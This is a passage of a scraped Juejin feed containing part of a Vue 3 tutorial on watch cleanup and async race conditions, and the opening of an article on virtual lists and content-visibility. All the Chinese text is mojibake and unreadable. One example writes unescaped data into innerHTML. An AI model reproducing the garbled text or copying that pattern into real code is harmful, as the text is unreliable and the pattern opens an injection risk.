      const <span class="hljs-attr">result</span> = await asyncFn(newValue, abortController.signal, () =&gt; cancelled)
      
      // æ£€æŸ¥æ˜¯å¦æ˜¯å½“å‰æœ€æ–°è¯·æ±‚
      if (!cancelled &amp;&amp; <span class="hljs-attr">currentToken</span> === token) {
        <span class="hljs-attr">data.value</span> = result
      }
    } catch (err) {
      if (err.name !== 'AbortError' &amp;&amp; !cancelled &amp;&amp; <span class="hljs-attr">currentToken</span> === token) {
        <span class="hljs-attr">error.value</span> = err
      }
    } finally {
      if (!cancelled &amp;&amp; <span class="hljs-attr">currentToken</span> === token) {
        <span class="hljs-attr">isLoading.value</span> = <span class="hljs-literal">false</span>
      }
    }
  }, { immediate })
  
  return { data, error, isLoading, stop }
}
</code></pre>
<h2 data-id="heading-10">ğŸ¯Â <strong>å®é™…æ¡ˆä¾‹ï¼šå®æ—¶èŠå¤©</strong></h2>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { ref, watch, onUnmounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useChatRoom</span>(<span class="hljs-params">roomId</span>) {
  <span class="hljs-keyword">const</span> messages = <span class="hljs-title function_">ref</span>([])
  <span class="hljs-keyword">const</span> isConnected = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
  
  <span class="hljs-keyword">let</span> socket = <span class="hljs-literal">null</span>
  <span class="hljs-keyword">let</span> reconnectTimer = <span class="hljs-literal">null</span>
  
  <span class="hljs-comment">// ç›‘å¬ roomId å˜åŒ–</span>
  <span class="hljs-title function_">watch</span>(<span class="hljs-function">() =&gt;</span> roomId.<span class="hljs-property">value</span>, <span class="hljs-function">(<span class="hljs-params">newRoomId, oldRoomId, onCleanup</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (!newRoomId) {
      messages.<span class="hljs-property">value</span> = []
      isConnected.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
      <span class="hljs-keyword">return</span>
    }
    
    <span class="hljs-keyword">let</span> cancelled = <span class="hljs-literal">false</span>
    
    <span class="hljs-title function_">onCleanup</span>(<span class="hljs-function">() =&gt;</span> {
      cancelled = <span class="hljs-literal">true</span>
      
      <span class="hljs-comment">// æ¸…ç† WebSocket è¿æ¥</span>
      <span class="hljs-keyword">if</span> (socket) {
        socket.<span class="hljs-title function_">close</span>()
        socket = <span class="hljs-literal">null</span>
      }
      
      <span class="hljs-comment">// æ¸…ç†é‡è¿å®šæ—¶å™¨</span>
      <span class="hljs-keyword">if</span> (reconnectTimer) {
        <span class="hljs-built_in">clearTimeout</span>(reconnectTimer)
        reconnectTimer = <span class="hljs-literal">null</span>
      }
    })
    
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">connectWebSocket</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">if</span> (cancelled) <span class="hljs-keyword">return</span>
      
      socket = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">`wss://api.example.com/chat/<span class="hljs-subst">${newRoomId}</span>`</span>)
      
      socket.<span class="hljs-property">onopen</span> = <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-keyword">if</span> (!cancelled) {
          isConnected.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
        }
      }
      
      socket.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (!cancelled) {
          <span class="hljs-keyword">const</span> message = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(event.<span class="hljs-property">data</span>)
          messages.<span class="hljs-property">value</span>.<span class="hljs-title function_">push</span>(message)
        }
      }
      
      socket.<span class="hljs-property">onclose</span> = <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-keyword">if</span> (!cancelled) {
          isConnected.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
          
          <span class="hljs-comment">// å°è¯•é‡è¿</span>
          <span class="hljs-keyword">if</span> (!cancelled) {
            reconnectTimer = <span class="hljs-built_in">setTimeout</span>(connectWebSocket, <span class="hljs-number">3000</span>)
          }
        }
      }
      
      socket.<span class="hljs-property">onerror</span> = <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (!cancelled) {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'WebSocket é”™è¯¯:'</span>, error)
        }
      }
    }
    
    <span class="hljs-title function_">connectWebSocket</span>()
  }, { <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span> })
  
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">sendMessage</span> = (<span class="hljs-params">content</span>) =&gt; {
    <span class="hljs-keyword">if</span> (socket &amp;&amp; socket.<span class="hljs-property">readyState</span> === <span class="hljs-title class_">WebSocket</span>.<span class="hljs-property">OPEN</span>) {
      socket.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ content }))
    }
  }
  
  <span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (socket) {
      socket.<span class="hljs-title function_">close</span>()
    }
  })
  
  <span class="hljs-keyword">return</span> { messages, isConnected, sendMessage }
}
</code></pre>
<h2 data-id="heading-11">ğŸ“Â <strong>æœ€ä½³å®è·µ</strong></h2>
<h3 data-id="heading-12">1.Â <strong>æ­£ç¡®çš„æ¸…ç†é¡ºåº</strong></h3>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">watch</span>(source, <span class="hljs-keyword">async</span> (value, oldValue, onCleanup) =&gt; {
  <span class="hljs-keyword">let</span> cancelled = <span class="hljs-literal">false</span>
  
  <span class="hljs-comment">// å…ˆè®¾ç½®å–æ¶ˆæ ‡å¿—</span>
  <span class="hljs-title function_">onCleanup</span>(<span class="hljs-function">() =&gt;</span> {
    cancelled = <span class="hljs-literal">true</span>
  })
  
  <span class="hljs-comment">// ç„¶åæ‰§è¡Œå¼‚æ­¥æ“ä½œ</span>
  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchData</span>(value)
  
  <span class="hljs-comment">// æ“ä½œå®Œæˆåæ£€æŸ¥æ˜¯å¦è¢«å–æ¶ˆ</span>
  <span class="hljs-keyword">if</span> (!cancelled) {
    <span class="hljs-comment">// æ›´æ–°çŠ¶æ€</span>
  }
})
</code></pre>
<h3 data-id="heading-13">2.Â <strong>ç»„åˆä½¿ç”¨å¤šç§æ¸…ç†</strong></h3>
<p>javascript</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">watch</span>(source, async (value, oldValue, onCleanup) =&gt; {
  let cancelled = false
  const controller = new <span class="hljs-built_in">AbortController</span>()
  const timeoutId = <span class="hljs-built_in">setTimeout</span>(() =&gt; {
    controller<span class="hljs-selector-class">.abort</span>()
  }, <span class="hljs-number">10000</span>)
  
  <span class="hljs-comment">// æ³¨å†Œå¤šä¸ªæ¸…ç†æ“ä½œ</span>
  <span class="hljs-built_in">onCleanup</span>(() =&gt; {
    cancelled = true
    controller<span class="hljs-selector-class">.abort</span>()
    <span class="hljs-built_in">clearTimeout</span>(timeoutId)
  })
  
  <span class="hljs-comment">// å¼‚æ­¥æ“ä½œ...</span>
})
</code></pre>
<h3 data-id="heading-14">3.Â <strong>å¤„ç†ç«æ€æ¡ä»¶çš„æ¨¡å¼</strong></h3>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">useLatestRequest</span> = (<span class="hljs-params">asyncFn</span>) =&gt; {
  <span class="hljs-keyword">let</span> currentRequest = <span class="hljs-literal">null</span>
  
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">async</span> (...args) =&gt; {
    <span class="hljs-comment">// å–æ¶ˆå‰ä¸€ä¸ªè¯·æ±‚</span>
    <span class="hljs-keyword">if</span> (currentRequest?.<span class="hljs-property">cancel</span>) {
      currentRequest.<span class="hljs-title function_">cancel</span>()
    }
    
    <span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>()
    <span class="hljs-keyword">const</span> request = {
      <span class="hljs-attr">promise</span>: <span class="hljs-title function_">asyncFn</span>(...args, controller.<span class="hljs-property">signal</span>),
      <span class="hljs-attr">cancel</span>: <span class="hljs-function">() =&gt;</span> controller.<span class="hljs-title function_">abort</span>()
    }
    
    currentRequest = request
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> request.<span class="hljs-property">promise</span>
      <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä»ç„¶æ˜¯å½“å‰è¯·æ±‚</span>
      <span class="hljs-keyword">if</span> (currentRequest === request) {
        <span class="hljs-keyword">return</span> result
      }
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-keyword">if</span> (error.<span class="hljs-property">name</span> !== <span class="hljs-string">'AbortError'</span>) {
        <span class="hljs-keyword">throw</span> error
      }
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
    }
  }
}
</code></pre>
<h3 data-id="heading-15">4.Â <strong>é¿å…çš„å†…å­˜æ³„æ¼</strong></h3>
<p>javascript</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// é”™è¯¯ç¤ºä¾‹ï¼šå¿˜è®°æ¸…ç†</span>
<span class="hljs-built_in">watch</span>(source, async () =&gt; {
  const timer = <span class="hljs-built_in">setInterval</span>(() =&gt; {
    <span class="hljs-comment">// åšä¸€äº›äº‹æƒ…</span>
  }, <span class="hljs-number">1000</span>)
  <span class="hljs-comment">// å¿˜è®°æ¸…ç†å®šæ—¶å™¨ï¼</span>
})

<span class="hljs-comment">// æ­£ç¡®ç¤ºä¾‹ï¼šä½¿ç”¨ onCleanup</span>
<span class="hljs-built_in">watch</span>(source, async (value, oldValue, onCleanup) =&gt; {
  const timer = <span class="hljs-built_in">setInterval</span>(() =&gt; {
    <span class="hljs-comment">// åšä¸€äº›äº‹æƒ…</span>
  }, <span class="hljs-number">1000</span>)
  
  <span class="hljs-built_in">onCleanup</span>(() =&gt; {
    <span class="hljs-built_in">clearInterval</span>(timer)
  })
})
</code></pre>
<h2 data-id="heading-16">ğŸš€Â <strong>æ€»ç»“</strong></h2>
<p><strong><code>onCleanup</code>Â çš„æ ¸å¿ƒä¼˜åŠ¿ï¼š</strong></p>
<ol>
<li><strong>è‡ªåŠ¨æ¸…ç†</strong>ï¼šwatch å›è°ƒæ‰§è¡Œå‰è‡ªåŠ¨è°ƒç”¨æ¸…ç†å‡½æ•°</li>
<li><strong>ç«æ€å®‰å…¨</strong>ï¼šç¡®ä¿åªæœ‰æœ€åä¸€æ¬¡è¯·æ±‚çš„ç»“æœè¢«å¤„ç†</li>
<li><strong>å†…å­˜å®‰å…¨</strong>ï¼šé˜²æ­¢å†…å­˜æ³„æ¼</li>
<li><strong>ç®€åŒ–ä»£ç </strong>ï¼šæ— éœ€æ‰‹åŠ¨ç®¡ç†æ¸…ç†é€»è¾‘</li>
</ol>
<p><strong>ä½¿ç”¨å»ºè®®ï¼š</strong></p>
<ul>
<li>æ‰€æœ‰æ¶‰åŠå¼‚æ­¥æ“ä½œçš„ watch éƒ½åº”è¯¥ä½¿ç”¨Â <code>onCleanup</code></li>
<li>å¯¹äºå®šæ—¶å™¨ã€WebSocketã€è®¢é˜…ç­‰èµ„æºï¼Œå¿…é¡»ä½¿ç”¨æ¸…ç†å‡½æ•°</li>
<li>ç»“åˆÂ <code>AbortController</code>Â å–æ¶ˆç½‘ç»œè¯·æ±‚</li>
<li>åœ¨ç»„åˆå¼å‡½æ•°ä¸­å§‹ç»ˆè¿”å›æ¸…ç†å‡½æ•°</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥è§£æé•¿åˆ—è¡¨æ€§èƒ½ä¼˜åŒ–æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7592610104441143306</link>    <guid>https://juejin.cn/post/7592610104441143306</guid>    <pubDate>2026-01-08T03:51:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592610104441143306" data-draft-id="7592582130594496563" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥è§£æé•¿åˆ—è¡¨æ€§èƒ½ä¼˜åŒ–æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2026-01-08T03:51:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†»æ¢¨"/> <meta itemprop="url" content="https://juejin.cn/user/204954927111739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥è§£æé•¿åˆ—è¡¨æ€§èƒ½ä¼˜åŒ–æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/204954927111739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†»æ¢¨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:51:46.000Z" title="Thu Jan 08 2026 03:51:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="an-old-hope">.hljs-comment,.hljs-quote{color:#b6b18b}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#eb3c54}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#e7ce56}.hljs-attribute{color:#ee7c2b}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#4fb4d7}.hljs-section,.hljs-title{color:#78bb65}.hljs-keyword,.hljs-selector-tag{color:#b45ea4}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1d21;color:#c0c5ce}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€é•¿åˆ—è¡¨æ€§èƒ½é—®é¢˜çš„æ ¹æº</h2>
<p>é•¿åˆ—è¡¨çš„æ€§èƒ½é—®é¢˜æœ¬è´¨æ˜¯ â€œDOM èŠ‚ç‚¹æ•°é‡è¿‡å¤šâ€ å¯¼è‡´æµè§ˆå™¨æ¸²æŸ“è¿‡è½½ï¼Œå…·ä½“è¡¨ç°ä¸ºï¼š</p>
<h3 data-id="heading-1">1.æ¸²æŸ“é˜¶æ®µè€—æ—¶ï¼š</h3>
<p>æµè§ˆå™¨éœ€ä¸ºæ¯ä¸ªèŠ‚ç‚¹æ‰§è¡Œæ ·å¼è®¡ç®—ï¼ˆRecalculate Styleï¼‰ã€å¸ƒå±€ï¼ˆLayoutï¼‰ã€ç»˜åˆ¶ï¼ˆPaintï¼‰ã€‚è‹¥åˆ—è¡¨æœ‰ 1000 æ¡æ•°æ®ï¼Œæ¯ä¸ªèŠ‚ç‚¹å¹³å‡è§¦å‘ 1ms æ ·å¼è®¡ç®—ï¼Œæ€»è€—æ—¶å°±è¾¾ 1 ç§’ï¼Œç›´æ¥å¯¼è‡´é¡µé¢åŠ è½½æ…¢ã€æ»šåŠ¨å¡é¡¿ã€‚</p>
<h3 data-id="heading-2">2.å†…å­˜å ç”¨è¿‡é«˜ï¼š</h3>
<p>æ¯ä¸ªDOMèŠ‚ç‚¹éœ€å­˜å‚¨å¤§é‡å±æ€§ï¼ˆå¦‚ offsetTopã€scrollHeightï¼‰ï¼Œ1000 ä¸ªèŠ‚ç‚¹å¯èƒ½å ç”¨æ•°ç™¾MBå†…å­˜ï¼Œä½ç«¯è®¾å¤‡æ˜“è§¦å‘å†…å­˜ä¸è¶³ã€‚</p>
<h2 data-id="heading-3">äºŒã€æ€§èƒ½é—®é¢˜ä¼˜åŒ–æ–¹æ¡ˆ</h2>
<h3 data-id="heading-4">1.å¤±æ•ˆçš„æ–¹æ¡ˆ</h3>
<h4 data-id="heading-5">æ‡’åŠ è½½ï¼šæ»šåŠ¨åˆ°åº•éƒ¨æ—¶åŠ è½½ä¸‹ä¸€é¡µæ•°æ®ã€‚</h4>
<p>ç¼ºç‚¹ï¼šæ•°æ®åŠ è½½åä»éœ€æ¸²æŸ“æ–°DOMï¼Œåˆ—è¡¨è¶Šé•¿ï¼Œå†…å­˜å’Œæ¸²æŸ“å‹åŠ›è¶Šå¤§ï¼ˆå¦‚åŠ è½½10 é¡µåï¼ŒDOM èŠ‚ç‚¹æ•°ä»è¾¾æ•°åƒï¼‰ã€‚</p>
<h3 data-id="heading-6">2.è¿›åŒ–çš„æ–¹æ¡ˆ</h3>
<h4 data-id="heading-7">è™šæ‹Ÿåˆ—è¡¨ï¼šåªæ¸²æŸ“å¯è§†åŒºåŸŸçš„DOMã€‚</h4>
<h4 data-id="heading-8">content-visibilityï¼šæµè§ˆå™¨è‡ªåŠ¨åˆ¤æ–­å…ƒç´ æ˜¯å¦åœ¨è§†å£å†…ï¼Œåªæ¸²æŸ“è§†å£å†…çš„DOMã€‚</h4>
<h2 data-id="heading-9">ä¸‰ã€æ–¹æ¡ˆå…·ä½“å®ç°ï¼ˆåªå®ç°è¿›åŒ–æ–¹æ¡ˆï¼‰</h2>
<h3 data-id="heading-10">1.è™šæ‹Ÿåˆ—è¡¨</h3>
<h4 data-id="heading-11">ï¼ˆ1ï¼‰è®¡ç®—å¯è§†åŒºåŸŸå‚æ•°</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//è®¾ç½®æ¯ä¸€é¡¹é«˜åº¦JavaScript</span>
<span class="hljs-keyword">const</span> itemHeight = <span class="hljs-number">50</span>;
<span class="hljs-comment">//è®¡ç®—å¯è§†åŒºåŸŸçš„é¡¹æ•°</span>
<span class="hljs-keyword">const</span> visibleCount = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(container.<span class="hljs-property">clientHeight</span> / itemHeight);
</code></pre>
<h4 data-id="heading-12">ï¼ˆ2ï¼‰å®šä½æ•°æ®ä¸DOM</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//æ·»åŠ æ»šåŠ¨ç›‘å¬å®æ—¶ç›‘å¬è§†å£å…ƒç´ èµ·å§‹ä¸Šæ ‡</span>
container.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">//è·å–æ»šåŠ¨é«˜åº¦</span>
    <span class="hljs-keyword">const</span> scrollTop = container.<span class="hljs-property">scrollTop</span>;
    <span class="hljs-comment">//è®¡ç®—è§†å£å…ƒç´ èµ·å§‹ä¸Šæ ‡</span>
    <span class="hljs-keyword">const</span> startIndex = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(scrollTop / itemHeight);
    <span class="hljs-comment">//æ¸²æŸ“è§†å£å…ƒç´ </span>
    <span class="hljs-title function_">renderVisibleData</span>(startIndex);
    <span class="hljs-comment">//åŒæ­¥åç§»é‡</span>
    visibleArea.<span class="hljs-property">style</span>.<span class="hljs-property">transform</span> = <span class="hljs-string">`translateY(<span class="hljs-subst">${scrollTop}</span>px)`</span>;
});

<span class="hljs-keyword">function</span> <span class="hljs-title function_">renderVisibleData</span>(<span class="hljs-params">startIndex</span>) {
    <span class="hljs-comment">//è®¡ç®—è§†å£å…ƒç´ ç»ˆæ­¢ä¸‹æ ‡</span>
    <span class="hljs-keyword">const</span> endIndex = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(data.<span class="hljs-property">length</span>, startIndex + visibleCount + <span class="hljs-number">2</span>);<span class="hljs-comment">//å¤šè·å–ä¸¤æ¡ç¼“å†²</span>
    <span class="hljs-comment">//æˆªå–è§†å£å…ƒç´ </span>
    <span class="hljs-keyword">const</span> visibleData = data.<span class="hljs-title function_">slice</span>(startIndex, endIndex);
    <span class="hljs-comment">//æ’å…¥DOM</span>
    <span class="hljs-keyword">let</span> html = <span class="hljs-string">''</span>;
    visibleData.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item, idx</span>) =&gt;</span> {
        html += <span class="hljs-string">`&lt;div class="virtual-item" &gt;<span class="hljs-subst">${item}</span>&lt;/div&gt;`</span>;
    });
    visibleArea.<span class="hljs-property">innerHTML</span> = html;
}
</code></pre>
<h4 data-id="heading-13">ï¼ˆ3ï¼‰ä¿æŒæ»šåŠ¨æ¡é«˜åº¦</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//ä½¿ç”¨å ä½å…ƒç´ ä¿æŒæ»šåŠ¨æ¡é«˜åº¦</span>
placeholder.<span class="hljs-property">style</span>.<span class="hljs-property">height</span> = <span class="hljs-string">`<span class="hljs-subst">${data.length * itemHeight}</span>px`</span>;
</code></pre>
<blockquote>
<p>æ€è€ƒ1ï¼šä¸ç­‰é«˜çš„åˆ—è¡¨é¡¹å¦‚ä½•ä½¿ç”¨è™šæ‹Ÿé˜Ÿåˆ—ï¼Ÿ</p>
</blockquote>
<h3 data-id="heading-14">2.content-visibility</h3>
<p>ç»™åˆ—è¡¨é¡¹æ·»åŠ content-visibility:auto;</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.normal-item</span> {
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">16px</span>;
    <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#f5f5f5</span>;
    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;
    <span class="hljs-attribute">content-visibility</span>: auto;
    <span class="hljs-attribute">contain</span>-intrinsic-size:<span class="hljs-number">50px</span>;//å¦‚ä¸åŠ <span class="hljs-attribute">contain</span>-intrinsic-sizeä¼šå‡ºç°æ»šåŠ¨æ¡æŠ–åŠ¨é—®é¢˜
}
</code></pre>
<blockquote>
<p>æ³¨æ„ï¼šcontent-visibility æ”¯æŒ Chrome 85+ã€Edge 85+ï¼ŒFirefox ä»…å®éªŒæ€§æ”¯æŒï¼ˆéœ€é…ç½®ï¼‰ã€‚</p>
</blockquote>
<h2 data-id="heading-15">å››ã€ç»“æœè¯„ä¼°</h2>
<h3 data-id="heading-16">1.æ™®é€šé•¿åˆ—è¡¨</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60597aa4d62d4555b882e605108fc093~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya75qKo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768449105&amp;x-signature=Etad6g2AW%2BNFNwlKCqIKNKpxN1A%3D" alt="image.png" loading="lazy"/>
æœªè¿›è¡Œä¼˜åŒ–çš„é•¿åˆ—è¡¨Renderingè€—æ—¶1328msï¼ŒPaintingè€—æ—¶21msã€‚</p>
<h3 data-id="heading-17">2.è™šæ‹Ÿåˆ—è¡¨</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/240fcabd53bd44d4a19ffb1bf0ce377f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya75qKo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768449105&amp;x-signature=wy2s6UuJwdYTqRn4%2BGfPXVpJ8xM%3D" alt="image.png" loading="lazy"/>
ä½¿ç”¨è™šæ‹Ÿåˆ—è¡¨ä¼˜åŒ–çš„é•¿åˆ—è¡¨Renderingè€—æ—¶1msï¼ŒPaintingè€—æ—¶1msã€‚å¤§å¤§ç¼©çŸ­äº†æ¸²æŸ“æ—¶é—´ã€‚</p>
<h3 data-id="heading-18">3.ä½¿ç”¨äº†content-visibilityä¼˜åŒ–çš„é•¿åˆ—è¡¨</h3>
